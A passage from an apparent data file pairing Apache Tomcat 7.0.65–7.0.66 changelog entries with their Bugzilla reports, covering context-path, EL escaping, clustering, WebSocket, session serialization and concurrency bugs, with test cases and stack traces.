 org.apache.catalina.Context startPathContext = embedded.createContext(""/startPath"",startPathContextRoot);

 embedded.start()

Then a request to http://host:port//startPath returns 404.
Whereas at Tomcat 7.0.52 it returns what we would expect from a request to 
http://host:port/startPath.
The same behaviour is seen with requests to extended URLs eg:
  http://host:port//startPath/anotherPath.
where they end up at the servlet as expected with 7.0.53 and not with 7.0.54

Debugging this a bit I found that the problem was introduced at 7.0.53 and by the changes under 
https://issues.apache.org/bugzilla/show_bug.cgi?id=56501
which for Tomcat 7 were revision 
http://svn.apache.org/viewvc?view=revision&revision=1594028
If I run our app without these changes in at 7.0.54 then it works fine.

Looking at the changes in the revision I saw some tests were added and so I tried adding some new tests to tomcat/trunk/test/org/apache/catalina/connector/TestRequest.java which I think example the problem:

    @Test
    public void testBug56501p() throws Exception {
        doBug56501(""/path"", ""//path"", ""/path"");
    }

    @Test
    public void testBug56501q() throws Exception {
        doBug56501(""/path"", ""//path/"", ""/path"");
    }

    @Test
    public void testBug56501r() throws Exception {
        doBug56501(""/path"", ""//path/bob"", ""/path"");
    }

    @Test
    public void testBug56501s() throws Exception {
        doBug56501(""/path"", ""//path/bob/"", ""/path"");

If I run these at 7.0.53 they pass.
and running at 7.0.54 they fail with:

Testcase: testBug56501p took 0.307 sec
	FAILED
expected:</[path]> but was:</[]>

Testcase: testBug56501q took 0.275 sec
	FAILED
expected:</[path]> but was:</[]>

Testcase: testBug56501r took 0.246 sec
	FAILED
expected:</[path]> but was:</[]>

Testcase: testBug56501s took 0.32 sec
	FAILED
expected:</[path]> but was:</[]>


I can try and create this with a simple servlet/setup if required if the test additions are not enough.

David"|https://bz.apache.org/bugzilla/show_bug.cgi?id=57215
Jasper|Tomcat 7.0.66 (violetagg)|fix||57136#c25: Implement a setting that controls what quoting rule is used when parsing EL expressions in attributes on a JSP page (chapter JSP.1.6 of specification). The setting name is quoteAttributeEL and it is configured as initialisation parameter of JSP Servlet (per web application configuration is possible) and as a command line option for JspC. The default value was changed to true, which restores behaviour implemented in Tomcat 7.0.64. It means that attribute quoting is applied on top of EL quoting. This provides better compatibility with older versions of Tomcat and other implementations. (kkolinko)|EL Parser escaping dollar sign not ${ or ${...}|"In the EL 3.0 spec it says...
    Alternatively, the escape characters \$ and \# can be used to escape what would
otherwise be treated as an eval-expression. Given the literal-expressions:
        \${exprA}
        \#{exprB}
    The resulting values would again be the strings ${exprA} and #{exprB}.

I believe that means it should not escape lets say ""Price: \\$500.00"" it should instead output ""Price: \$500.00""(it currently would output ""Price: $500.00"") but should instead escape ""Price: \\${500.00}"" and the output of that would be ""Price: ${500.00}"".

Normally this wouldn't be run into, but I happened to run into this issue passing javascript code through the EL processor, that happens to have some escaped dollar signs inside some regex strings.

It maybe a little more acceptable to use \${ and \#{ as the escapes, as that is a better indication that there is about to be an expression"|https://bz.apache.org/bugzilla/show_bug.cgi?id=57136#c25
Cluster|Tomcat 7.0.66 (violetagg)|fix||Optimize the session lock range in DeltaManager.requestCompleted. (kfujino)|||
Cluster|Tomcat 7.0.66 (violetagg)|fix||Enable an explicit configuration of local member in the static cluster membership. (kfujino)|||
Cluster|Tomcat 7.0.66 (violetagg)|fix||Fix potential integer overflow in DeltaSession. Reported by coverity scan. (fschumacher)|||
Tribes|Tomcat 7.0.66 (violetagg)|code||Distinguish the handling of the shutdown payload and member verification clearly. When handling shutdown payload, verification completion message is not required. (kfujino)|||
Tribes|Tomcat 7.0.66 (violetagg)|fix||When starting the StaticMembershipInterceptor, StaticMembershipInterceptor checks the required Interceptors. If the required Interceptor does not exist, it issues warning logs. (kfujino)|||
Tribes|Tomcat 7.0.66 (violetagg)|fix||Ensure that the static member is registered to the add suspect list even if the static member that is registered to the remove suspect list has disappeared. (kfujino)|||
Tribes|Tomcat 7.0.66 (violetagg)|fix||Correct the warning log of when the member that is not registered in the membership is detected. (kfujino)|||
Tribes|Tomcat 7.0.66 (violetagg)|fix||When using a static cluster, add the members that have been cached in the membership service to the map members list in order to ensure that the map member is a static member. (kfujino)|||
WebSocket|Tomcat 7.0.66 (violetagg)|fix||Use instance manager for server endpoint instances. (remm)|||
WebSocket|Tomcat 7.0.66 (violetagg)|add|55006|The WebSocket client now honors the java.net.java.net.ProxySelector configuration (using the HTTP type) when establishing WebSocket connections to servers. Based on a patch by Niki Dokovski. (markt)|Add http proxy support for ClientEndpoint using system properties [PATCH]|Currently there is no support for utilization of http proxy for ClientEndpoints. Here is a patch that illustrates the usage of http(s).proxy(Host)(Port) system properties. A request for improvement in WebSocket JSR 356 can be found here https://java.net/jira/browse/WEBSOCKET_SPEC-202|https://bz.apache.org/bugzilla/show_bug.cgi?id=55006
WebSocket|Tomcat 7.0.66 (violetagg)|fix|58624|Correct a thread safety issue that meant that blocking message writes could block indefinitely if the WebSocket connection was closed while a message write was in progress. (markt)|Websocket send blocks indefinitely in FutureToSendHandler|"- Tomcat 8.0.24
- APR connector disabled, using the NIO connector
- SSL is on
- Encoder is of type Encoder.Text<Object>

We found this during load tests, it only happened to one message out of millions but there is nothing special about that message.

We have a class that wraps javax.websocket.RemoteEndpoint.Basic to ensure that it's thread-safe - so messages are never sent from multiple threads on one socket.

The FutureToSendHandler gets stuck waiting for the call to onResult. Looking at the code, logically sendStringByCompletion(msg, completion) (WsRemoteEndpoint.java:573) must not call the onResult for some code path. I am trying to figure out where but no luck so far.

This is the first time we have seen this problem over many load tests so unfortunately we can't try to replicate on the latest at the moment.

""defaultEventExecutorGroup-3-18"" - Thread t@61
   java.lang.Thread.State: WAITING
	at sun.misc.Unsafe.park(Native Method)
	- parking to wait for <2fcb7fa> (a java.util.concurrent.CountDownLatch$Sync)
	at java.util.concurrent.locks.LockSupport.park(Unknown Source)
	at java.util.concurrent.locks.AbstractQueuedSynchronizer.parkAndCheckInterrupt(Unknown Source)
	at java.util.concurrent.locks.AbstractQueuedSynchronizer.doAcquireSharedInterruptibly(Unknown Source)
	at java.util.concurrent.locks.AbstractQueuedSynchronizer.acquireSharedInterruptibly(Unknown Source)
	at java.util.concurrent.CountDownLatch.await(Unknown Source)
	at org.apache.tomcat.websocket.FutureToSendHandler.get(FutureToSendHandler.java:76)
	at org.apache.tomcat.websocket.FutureToSendHandler.get(FutureToSendHandler.java:31)
	at org.apache.tomcat.websocket.WsRemoteEndpointImplBase.sendObject(WsRemoteEndpointImplBase.java:521)
	at org.apache.tomcat.websocket.WsRemoteEndpointBasic.sendObject(WsRemoteEndpointBasic.java:74)
        ..."|https://bz.apache.org/bugzilla/show_bug.cgi?id=58624
Web applications|Tomcat 7.0.66 (violetagg)|add||Make it clear in the documentation for the CGI servlet that the debug page is not considered secure and should not be used in production. (markt)|||
Web applications|Tomcat 7.0.66 (violetagg)|fix||The domain attribute of StaticMember is not required but optional. (kfujino)|||
Web applications|Tomcat 7.0.66 (violetagg)|fix|58631|Correct the continuation character use in the Windows Service How-To page of the documentation web application. (markt)|Documentation uses wrong syntax for windows command line continuation|"As reported here:

http://marc.info/?l=tomcat-dev&m=144668952212845&w=2

The documentationshould use ""^"" instead of ""\"" and use the correct continuation prompt (or none).

https://github.com/apache/tomcat/blob/trunk/webapps/docs/windows-service-howto.xml#L363

The doc is wrong on the main tomcat site and the comments pointing this out are quite old. This is why I filed an additional bug even if there is no documentation/site category here. Sorry for thatby my tomcat-dev mail was also unresponded. The above post does contain a proposed diff."|https://bz.apache.org/bugzilla/show_bug.cgi?id=58631
jdbc-pool|Tomcat 7.0.66 (violetagg)|fix|58489|Correct QueryStatsComparator to hold up the general contract for Comparator. (fschumacher)|QueryStatsComparator throws IllegalArgumentException: Comparison method violates its general contract!|"Created attachment 33177 [details]
JUnit test to show the exception

Overview: 

QueryStatsComparator may throw java.lang.IllegalArgumentException: Comparison method violates its general contract! 
This happens in specific situations depending on the data in the reported queries. In our environment this occurs every time we keep the server running until the maxCapacity (1000 items) is reached and the removeOldest method is called. I have managed to narrow down the test data from more than 1000 records to around 40 items and created a JUnit test to showcase the error. I needed to copy some parts out of the SlowQueryReport class and made some simplifications as the QueryStatsComparator is not reachable from outside.

Steps to Reproduce: 

Please use the attached JUnit source code to reproduce this error.

Additional Builds and Platforms: 

This bug seems to happen on all platforms.
We are using Tomcat 8, tomcat-dbcp 8.0.24, JDK 1.80.0_60.

Additional Information: 

It seems to be a problem of the first two lines of the QueryStatsComparator. Note that a single change in the data of the unit test may cause the Exception not to occur.

Stacktrace:

java.lang.IllegalArgumentException: Comparison method violates its general contract!
	at java.util.TimSort.mergeLo(TimSort.java:773)
	at java.util.TimSort.mergeAt(TimSort.java:510)
	at java.util.TimSort.mergeCollapse(TimSort.java:435)
	at java.util.TimSort.sort(TimSort.java:241)
	at java.util.Arrays.sort(Arrays.java:1512)
	at java.util.ArrayList.sort(ArrayList.java:1454)
	at java.util.Collections.sort(Collections.java:175)
	at org.apache.tomcat.jdbc.pool.interceptor.SlowQueryReport.removeOldest(SlowQueryReport.java:218)
	at org.apache.tomcat.jdbc.pool.interceptor.SlowQueryReport.getQueryStats(SlowQueryReport.java:205)
	at org.apache.tomcat.jdbc.pool.interceptor.SlowQueryReport.reportQuery(SlowQueryReport.java:119)
	at org.apache.tomcat.jdbc.pool.interceptor.AbstractQueryReport$StatementProxy.invoke(AbstractQueryReport.java:254)"|https://bz.apache.org/bugzilla/show_bug.cgi?id=58489
jdbc-pool|Tomcat 7.0.66 (violetagg)|fix||When creating a QueryStats object, ensure that maxQueries is checked. If maxQueries is a value less than or equal to 0, QueryStats are never created. (kfujino)|||
jdbc-pool|Tomcat 7.0.66 (violetagg)|fix||Fix potential integer overflow in ConnectionPool and PooledConnection. Reported by coverity scan. (fschumacher)|||
Catalina|Tomcat 7.0.65 (violetagg)|add|57681|Add a web application class loader implementation that supports the parallel loading of web application classes. Use of this feature requires a Java 7 or later JRE. Based on a patch by Huxing Zhang. (markt)|Allow parallel class loading in web application class loader by synchronizing on class specific object|"Created attachment 32553 [details]
Parallel classloading port from Tc8.0 into Tc7.0

Related to fix in Tomcat8.0:
Fix https://issues.apache.org/bugzilla/show_bug.cgi?id=56530
Add a web application class loader implementation that supports the parallel loading of web application classes.

Source file to patch:
https://svn.apache.org/viewvc/tomcat/tc7.0.x/trunk/java/org/apache/catalina/loader/WebappClassLoader.java?revision=1661811&view=markup"|https://bz.apache.org/bugzilla/show_bug.cgi?id=57681
Catalina|Tomcat 7.0.65 (violetagg)|fix|58187|Correct a regression in the fix for 57765 that meant that deployment of web applications deployed via the Manager application was delayed until the next execution of the automatic deployment background process. (markt)|Tomcat manager incorrect deployment status|"When using the manager to deploy a war file (using html or text version of the manager), the response sent from the tomcat manager appears before the application ends its starting. 
It appears after deployment but before application's context is fully up. That means if the application fails in its start process, Tomcat manager will already have answered that the application has been deployed.

It was not the case with Tomcat 7.0.61.
It affects versions 7.0.63, and 7.0.62 of the Tomcat manager.

The parameters used are: 
- war file located on server (/home/xxx.war),
- update = true,
- simple context (my-context)

Maybe the response has become asynchronous when Tomcat manager is deploying war file ? 
It would be very strange since the reload is not asynchronous in all Tomcat versions."|https://bz.apache.org/bugzilla/show_bug.cgi?id=58187
Catalina|Tomcat 7.0.65 (violetagg)|fix|58284|Correctly implement session serialization so non-serializable attributes are skipped with a warning. Patch provided by Andrew Shore. (markt)|StandardSession attempts to silently write NonSerializable objects|"Customer reported an issue with non-serializable objects when using our DynamoDB Session manager (https://github.com/aws/aws-dynamodb-session-tomcat/issues/30). After digging into the code it looks like StandardSession is attempting to do several things when giving non-serializable attributes. For top level objects that don't implement serializable it silently removes it. That code is working fine although I am a little wary that it doesn't fail as this could hide bugs in the users code and make it difficult for them to determine why a certain attribute isn't being persisted to the backing store. After that StandardSession attempts to write the remaining attributes to the ObjectOutputStream. If a serialization exception is encountered here (i.e. some object in the object graph does not implement Serializable) then the exception is caught and a special indicator NOT_SERIALIZED is written to the object stream and a warning is logged. Now internally ObjectOutputStream is handling the same exception and writing it's own special marker, TC_EXCEPTION, and the serialized exception object to the stream. This is written before StandardSession has a chance to write NOT_SERIALIZED. In StandardSession.readObject there is logic to skip deserializing any objects that have been written to the stream as NOT_SERIALIZED. This code can never actually be executed though as ObjectInputStream is checking if there are any occurences of TC_EXCEPTION and will deserialize the exception object, wrap it in a WriteAbortedException and throw it out. This causes a session with non-serializable objects in the attributes to be written ""successfully"" but causes an exception to be thrown when attempting to read that same session.

I understand modifying StandardSession to now throw exceptions when non-serializable objects are encountered could be considered a breaking change so I propose adding some kind of overload or configuration to enable this behavior for users that want to opt in. Failing fast when non-serializable attributes are detected seems like the right way to go as this should be fixed in the customers code. I'm willing to submit a patch for this although I wanted to open the issue first to make sure you concur with my assessment and coding up a patch is worth my time."|https://bz.apache.org/bugzilla/show_bug.cgi?id=58284
Catalina|Tomcat 7.0.65 (violetagg)|fix|58313|Fix concurrent access of encoders map when clearing encoders prior to switch to async. (markt)|Data race inside the non-thread-safe HashMap org.apache.catalina.connector.OutputBuffer.encoders|"I am running the test suite against a dynamic race detector called RV-Predict. I get a few race reports on the HashMap org.apache.catalina.connector.OutputBuffer.encoders:

Data race on field java.util.HashMap.$state: {{{
Concurrent write in thread T83 (locks held: {Monitor@67298f15})
 ---->  at org.apache.catalina.connector.OutputBuffer.clearEncoders(OutputBuffer.java:255)
        at org.apache.catalina.connector.Response.clearEncoders(Response.java:295)
        at org.apache.catalina.connector.CoyoteAdapter.service(CoyoteAdapter.java:587)
        at org.apache.coyote.http11.AbstractHttp11Processor.process(AbstractHttp11Processor.java:1091)
        at org.apache.coyote.AbstractProtocol$AbstractConnectionHandler.process(AbstractProtocol.java:668)
        at org.apache.tomcat.util.net.Nio2Endpoint$SocketProcessor.doRun(Nio2Endpoint.java:1073)
        at org.apache.tomcat.util.net.Nio2Endpoint$SocketProcessor.run(Nio2Endpoint.java:1032)
        - locked Monitor@67298f15 at org.apache.tomcat.util.net.Nio2Endpoint$SocketProcessor.run(Nio2Endpoint.java:1031)
        at org.apache.tomcat.util.threads.TaskThread$WrappingRunnable.run(TaskThread.java:61)
    T83 is created by T82
        at java.util.concurrent.ThreadPoolExecutor.addWorker(ThreadPoolExecutor.java:1010)

Concurrent read in thread T84 (locks held: {})
 ---->  at org.apache.catalina.connector.OutputBuffer.setConverter(OutputBuffer.java:580)
        at org.apache.catalina.connector.OutputBuffer.checkConverter(OutputBuffer.java:563)
        at org.apache.catalina.connector.Response.getWriter(Response.java:599)
        at org.apache.catalina.connector.ResponseFacade.getWriter(ResponseFacade.java:212)
        at org.apache.coyote.http11.TestAbstractHttp11Processor$Bug57621Servlet$1.run(TestAbstractHttp11Processor.java:757)
        at org.apache.catalina.core.AsyncContextImpl$RunnableWrapper.run(AsyncContextImpl.java:549)
        at org.apache.tomcat.util.threads.TaskThread$WrappingRunnable.run(TaskThread.java:61)
    T84 is created by T83
        at java.util.concurrent.ThreadPoolExecutor.addWorker(ThreadPoolExecutor.java:1010)
}}} 

Data race on field java.util.HashMap.$state: {{{
Concurrent write in thread T60 (locks held: {Monitor@93a8632})
 ---->  at org.apache.catalina.connector.OutputBuffer.clearEncoders(OutputBuffer.java:255)
        at org.apache.catalina.connector.Response.clearEncoders(Response.java:295)
        at org.apache.catalina.connector.CoyoteAdapter.service(CoyoteAdapter.java:587)
        at org.apache.coyote.http11.AbstractHttp11Processor.process(AbstractHttp11Processor.java:1091)
        at org.apache.coyote.AbstractProtocol$AbstractConnectionHandler.process(AbstractProtocol.java:668)
        at org.apache.tomcat.util.net.JIoEndpoint$SocketProcessor.run(JIoEndpoint.java:277)
        - locked Monitor@93a8632 at org.apache.tomcat.util.net.JIoEndpoint$SocketProcessor.run(JIoEndpoint.java:259)
        at org.apache.tomcat.util.threads.TaskThread$WrappingRunnable.run(TaskThread.java:61)
    T60 is created by T58
        at java.util.concurrent.ThreadPoolExecutor.addWorker(ThreadPoolExecutor.java:1010)

Concurrent read in thread T61 (locks held: {})
 ---->  at org.apache.catalina.connector.OutputBuffer.setConverter(OutputBuffer.java:604)
        at org.apache.catalina.connector.OutputBuffer.checkConverter(OutputBuffer.java:563)
        at org.apache.catalina.connector.Response.getWriter(Response.java:599)
        at org.apache.catalina.connector.ResponseFacade.getWriter(ResponseFacade.java:212)
        at org.apache.coyote.http11.TestAbstractHttp11Processor$Bug57621Servlet$1.run(TestAbstractHttp11Processor.java:757)
        at org.apache.catalina.core.AsyncContextImpl$RunnableWrapper.run(AsyncContextImpl.java:549)
        at org.apache.tomcat.util.threads.TaskThread$WrappingRunnable.run(TaskThread.java:61)
    T61 is created by T60
        at java.util.concurrent.ThreadPoolExecutor.addWorker(ThreadPoolExecutor.java:1010)
}}} 

Looks like OutputBuffer.encoders is accessed from multiple threads without proper synchronization."|https://bz.apache.org/bugzilla/show_bug.cgi?id=58313
Catalina|Tomcat 7.0.65 (violetagg)|fix|58320|Fix concurrent access of request attributes which is possible during asynchronous processing. (markt)|Data race inside the non-thread-safe HashMap org.apache.catalina.connector.Request.attributes|"Reported by RV-Predict (a dynamic race detector) when running the test suite:

Data race on field java.util.HashMap.$state: {{{
Concurrent read in thread T122 (locks held: {Monitor@5d0626be})
 ---->  at org.apache.catalina.connector.Request.getAttribute(Request.java:876)
        at org.apache.catalina.core.StandardHostValve.invoke(StandardHostValve.java:169)
        at org.apache.catalina.valves.ErrorReportValve.invoke(ErrorReportValve.java:79)
        at org.apache.catalina.core.StandardEngineValve.invoke(StandardEngineValve.java:88)
        at org.apache.catalina.connector.CoyoteAdapter.service(CoyoteAdapter.java:518)
        at org.apache.coyote.http11.AbstractHttp11Processor.process(AbstractHttp11Processor.java:1091)
        at org.apache.coyote.AbstractProtocol$AbstractConnectionHandler.process(AbstractProtocol.java:668)
        at org.apache.tomcat.util.net.JIoEndpoint$SocketProcessor.run(JIoEndpoint.java:277)
        - locked Monitor@5d0626be at org.apache.tomcat.util.net.JIoEndpoint$SocketProcessor.run(JIoEndpoint.java:259)
        at org.apache.tomcat.util.threads.TaskThread$WrappingRunnable.run(TaskThread.java:61)
    T122 is created by T120
        at java.util.concurrent.ThreadPoolExecutor.addWorker(ThreadPoolExecutor.java:1010)

Concurrent write in thread T123 (locks held: {})
 ---->  at org.apache.catalina.connector.Request.setAttribute(Request.java:1480)
        at org.apache.catalina.core.AsyncContextImpl.dispatch(AsyncContextImpl.java:192)
        at org.apache.catalina.core.AsyncContextImpl.dispatch(AsyncContextImpl.java:178)
        at org.apache.catalina.core.TestAsyncContextImpl$Bug53337ServletB$1.run(TestAsyncContextImpl.java:1456)
    T123 is created by T122
        at java.util.concurrent.ThreadPoolExecutor.addWorker(ThreadPoolExecutor.java:1010)
}}}"|https://bz.apache.org/bugzilla/show_bug.cgi?id=58320
Catalina|Tomcat 7.0.65 (violetagg)|code||In preparation for implementing enhancement 57681, replace the use of the StandardClassLoader with URLClassLoader. This removes the server class loader from JMX. (markt)|Allow parallel class loading in web application class loader by synchronizing on class specific object|"Created attachment 32553 [details]
Parallel classloading port from Tc8.0 into Tc7.0

Related to fix in Tomcat8.0:
Fix https://issues.apache.org/bugzilla/show_bug.cgi?id=56530
Add a web application class loader implementation that supports the parallel loading of web application classes.

Source file to patch:
https://svn.apache.org/viewvc/tomcat/tc7.0.x/trunk/java/org/apache/catalina/loader/WebappClassLoader.java?revision=1661811&view=markup"|https://bz.apache.org/bugzilla/show_bug.cgi?id=57681
Catalina|Tomcat 7.0.65 (violetagg)|fix|58352|Always trigger a thread dump if Tomcat fails to stop gracefully from catalina.sh even if using -force. Patch provided by Alexandre Garnier. (markt)|No stacktrace when tomcat stop doesn't complete and using '-force'|"It's an extension of bug #45428.
The solution skip the case when using '-force' => no stacktrace to investigate the stopping problem."|https://bz.apache.org/bugzilla/show_bug.cgi?id=58352
Catalina|Tomcat 7.0.65 (violetagg)|fix|58416|Correctly detect when a forced stop fails to stop Tomcat because the Tomcat process is waiting on some system call or is uninterruptible. (markt)|Possibly wrong check condition in catalina.sh|"Created attachment 33112 [details]
patch file

please see attachment patch.

last $KILL_SLEEP_INTERVAL check condition may be wrong.
 ""gt""->""lt"""|https://bz.apache.org/bugzilla/show_bug.cgi?id=58416
Catalina|Tomcat 7.0.65 (violetagg)|fix|58436|Fix some rare data races in JULI's ClassLoaderLogManager during shutdown. (markt)|Data Race in class org/apache/juli/ClassLoaderLogManager|"Using http://vmlens.com to find data races I found the following data race:
In ClassLoaderLogManager the method addLogger access the classLoaderLoggers hashmap synchronized but the method shutdown does not use any synchronization.

Here are example stacktraces:
localhost-startStop-1 (16)
java/util/concurrent/ThreadPoolExecutor$Worker.run 
java/util/concurrent/ThreadPoolExecutor.runWorker 
java/util/concurrent/FutureTask.run 
java/util/concurrent/Executors$RunnableAdapter.call
org/apache/catalina/startup/HostConfig$DeployWar.run
org/apache/catalina/startup/HostConfig.deployWAR
org/apache/catalina/core/StandardHost.addChild
org/apache/catalina/core/ContainerBase.addChild
org/apache/catalina/core/ContainerBase.addChildInternal
org/apache/catalina/util/LifecycleBase.start
org/apache/catalina/core/StandardContext.startInternal
org/apache/catalina/core/ContainerBase.getLogger
org/apache/juli/logging/LogFactory.getLog
org/apache/juli/logging/LogFactory.getInstance
org/apache/juli/logging/DirectJDKLog.getInstance
org/apache/juli/logging/DirectJDKLog.<init>
java/util/logging/Logger.getLogger
java/util/logging/Logger.demandLogger
java/util/logging/LogManager.demandLogger
org/apache/juli/ClassLoaderLogManager.getLogger
org/apache/juli/ClassLoaderLogManager.getClassLoaderInfo
org/apache/juli/ClassLoaderLogManager$2.run
org/apache/juli/ClassLoaderLogManager$2.run
org/apache/juli/ClassLoaderLogManager.readConfiguration
java/util/WeakHashMap.put 

Thread-1 (12)
java/util/concurrent/ThreadPoolExecutor$Worker.run	
org/apache/juli/ClassLoaderLogManager$Cleaner.run	
org/apache/juli/ClassLoaderLogManager.shutdown	
java/util/WeakHashMap$HashIterator.nextEntry"|https://bz.apache.org/bugzilla/show_bug.cgi?id=58436
Coyote|Tomcat 7.0.65 (violetagg)|fix||Correct some edge cases in RequestUtil.normalize(). (markt)|||
Coyote|Tomcat 7.0.65 (violetagg)|fix|58275|The IBM JREs accept cipher suite names starting with TLS_ or SSL_ but when listing the supported cipher suites only the SSL_ version is reported. This can break Tomcat's check that at least one requested cipher suite is supported. Tomcat now includes a work-around so either form of the cipher suite name can be used when running on an IBM JRE. (markt)|TLS prefixed ciphers are discarded with IBM JRE|"Regarding IBM JRE ciphersuites, below IBM documentation says that 

https://www-01.ibm.com/support/knowledgecenter/SSYKE2_7.0.0/com.ibm.java.security.component.71.doc/security-component/jsse2Docs/ciphersuites.html

+++++++
Note: In the following list, the string ""SSL"" is interchangeable with ""TLS"" and vice versa. For example, where SSL_RSA_WITH_AES_128_CBC_SHA is specified, TLS_RSA_WITH_AES_128_CBC_SHA also applies.
++++++++


However if I set TLS prefixed ciphers using the setCiphers method of org.apache.coyote.http11.Http11Protocol object, it is not taking effect. I see the following bugzilla thread which says 

https://bz.apache.org/bugzilla/show_bug.cgi?id=57718

+++
IBM uses SSL_XXX for all it ciphers although it will accept TLS_XXX. When Tomcat compares the available ciphers against the requested ciphers it can't tell that SSL_XXX and TLS_XXX are the same.
+++++++++++

My request here is to see we have some option to avoid this check of cipher list against the available ciphers?. If not, can we have such option, as a JVM parameter or something, so that we can make use of it to allow TLS prefixed ciphers with IBM JRE?"|https://bz.apache.org/bugzilla/show_bug.cgi?id=58275
Coyote|Tomcat 7.0.65 (violetagg)|fix|58357|For reasons not currently understood when the APR/native connector is used with OpenSSL reads can return an error code when there is no apparent error. This was work-around for HTTP upgrade connections by treating this as EAGAIN. The same fix has now been applied to the standard HTTP connector. (markt)|Read failed with APR/native error code [20,014]|"Created attachment 33090 [details]
Solr webapp log

Tomcat throws exception while reading from SSL/TLS APR connector. I attached detailed log.

04-Sep-2015 01:14:15.665 SEVERE [http-apr-9443-exec-6] org.apache.solr.common.SolrException.log org.apache.solr.common.SolrException: Read failed with APR/native error code [20,014]
	at org.apache.solr.handler.loader.XMLLoader.load(XMLLoader.java:176)
...
Caused by: com.ctc.wstx.exc.WstxIOException: Read failed with APR/native error code [20,014]
	at com.ctc.wstx.sr.StreamScanner.throwFromIOE(StreamScanner.java:708)
	at com.ctc.wstx.sr.BasicStreamReader.next(BasicStreamReader.java:1086)
	at org.apache.solr.handler.loader.XMLLoader.readDoc(XMLLoader.java:391)
...
Caused by: java.io.IOException: Read failed with APR/native error code [20,014]
	at org.apache.coyote.http11.InternalAprInputBuffer.fill(InternalAprInputBuffer.java:607)
	at org.apache.coyote.http11.InternalAprInputBuffer$SocketInputBuffer.doRead(InternalAprInputBuffer.java:688)
	at org.apache.coyote.http11.filters.ChunkedInputFilter.readBytes(ChunkedInputFilter.java:314)


The serverside exception cause an exception on the SolrJ client. Additional logs and server.xml forthcoming."|https://bz.apache.org/bugzilla/show_bug.cgi?id=58357
Coyote|Tomcat 7.0.65 (violetagg)|fix|57799|Remove useless sendfile check for NIO SSL. (remm)|MessageCreationException: Couldn't create SOAP message with Nio2 connector protocol|"Our SOAP client connects to our web service when Tomcat is configured with default Nio connector protocol. With the new Nio 2 connector protocol, we get:

07-Apr-2015 08:17:06.166 SEVERE [http-nio2-8443-exec-10] com.sun.xml.ws.transport.http.HttpAdapter$HttpToolkit.handle Couldn't create SOAP message due to exception: java.nio.channels.ReadPendingException
 com.sun.xml.ws.protocol.soap.MessageCreationException: Couldn't create SOAP message due to exception: java.nio.channels.ReadPendingException
	at com.sun.xml.ws.encoding.SOAPBindingCodec.decode(SOAPBindingCodec.java:363)
	at com.sun.xml.ws.transport.http.HttpAdapter.decodePacket(HttpAdapter.java:336)
	at com.sun.xml.ws.transport.http.HttpAdapter.access$400(HttpAdapter.java:96)
	at com.sun.xml.ws.transport.http.HttpAdapter$HttpToolkit.handle(HttpAdapter.java:591)
	at com.sun.xml.ws.transport.http.HttpAdapter.handle(HttpAdapter.java:259)
	at com.sun.xml.ws.transport.http.servlet.ServletAdapter.invokeAsync(ServletAdapter.java:213)
	at com.sun.xml.ws.transport.http.servlet.WSServletDelegate.doGet(WSServletDelegate.java:159)
	at com.sun.xml.ws.transport.http.servlet.WSServletDelegate.doPost(WSServletDelegate.java:194)
	at com.sun.xml.ws.transport.http.servlet.WSServlet.doPost(WSServlet.java:80)
	at javax.servlet.http.HttpServlet.service(HttpServlet.java:644)
	at javax.servlet.http.HttpServlet.service(HttpServlet.java:725)
	at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:291)
	at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:206)
	at org.apache.tomcat.websocket.server.WsFilter.doFilter(WsFilter.java:52)
	at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:239)
	at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:206)
	at org.apache.catalina.core.StandardWrapperValve.invoke(StandardWrapperValve.java:219)
	at org.apache.catalina.core.StandardContextValve.invoke(StandardContextValve.java:106)
	at org.apache.catalina.core.StandardHostValve.invoke(StandardHostValve.java:142)
	at org.apache.catalina.valves.ErrorReportValve.invoke(ErrorReportValve.java:79)
	at org.apache.catalina.valves.AbstractAccessLogValve.invoke(AbstractAccessLogValve.java:610)
	at org.apache.catalina.core.StandardEngineValve.invoke(StandardEngineValve.java:88)
	at org.apache.catalina.connector.CoyoteAdapter.service(CoyoteAdapter.java:537)
	at org.apache.coyote.http11.AbstractHttp11Processor.process(AbstractHttp11Processor.java:1085)
	at org.apache.coyote.AbstractProtocol$AbstractConnectionHandler.process(AbstractProtocol.java:658)
	at org.apache.coyote.http11.Http11Nio2Protocol$Http11ConnectionHandler.process(Http11Nio2Protocol.java:176)
	at org.apache.tomcat.util.net.Nio2Endpoint$SocketProcessor.doRun(Nio2Endpoint.java:1087)
	at org.apache.tomcat.util.net.Nio2Endpoint$SocketProcessor.run(Nio2Endpoint.java:1046)
	at java.util.concurrent.ThreadPoolExecutor.runWorker(Unknown Source)
	at java.util.concurrent.ThreadPoolExecutor$Worker.run(Unknown Source)
	at org.apache.tomcat.util.threads.TaskThread$WrappingRunnable.run(TaskThread.java:61)
	at java.lang.Thread.run(Unknown Source)
Caused by: java.nio.channels.ReadPendingException
	at org.apache.tomcat.util.net.SecureNio2Channel.read(SecureNio2Channel.java:610)
	at org.apache.coyote.http11.InternalNio2InputBuffer.fill(InternalNio2InputBuffer.java:223)
	at org.apache.coyote.http11.InternalNio2InputBuffer$SocketInputBuffer.doRead(InternalNio2InputBuffer.java:331)
	at org.apache.coyote.http11.filters.ChunkedInputFilter.readBytes(ChunkedInputFilter.java:314)
	at org.apache.coyote.http11.filters.ChunkedInputFilter.parseChunkHeader(ChunkedInputFilter.java:344)
	at org.apache.coyote.http11.filters.ChunkedInputFilter.doRead(ChunkedInputFilter.java:184)
	at org.apache.coyote.http11.AbstractInputBuffer.doRead(AbstractInputBuffer.java:413)
	at org.apache.coyote.Request.doRead(Request.java:460)
	at org.apache.catalina.connector.InputBuffer.realReadBytes(InputBuffer.java:338)
	at org.apache.tomcat.util.buf.ByteChunk.substract(ByteChunk.java:395)
	at org.apache.catalina.connector.InputBuffer.read(InputBuffer.java:363)
	at org.apache.catalina.connector.CoyoteInputStream.read(CoyoteInputStream.java:190)
	at sun.nio.cs.StreamDecoder.readBytes(Unknown Source)
	at sun.nio.cs.StreamDecoder.implRead(Unknown Source)
	at sun.nio.cs.StreamDecoder.read(Unknown Source)
	at java.io.InputStreamReader.read(Unknown Source)
	at com.ctc.wstx.io.MergedReader.read(MergedReader.java:105)
	at com.ctc.wstx.io.ReaderSource.readInto(ReaderSource.java:87)
	at com.ctc.wstx.io.BranchingReaderSource.readInto(BranchingReaderSource.java:57)
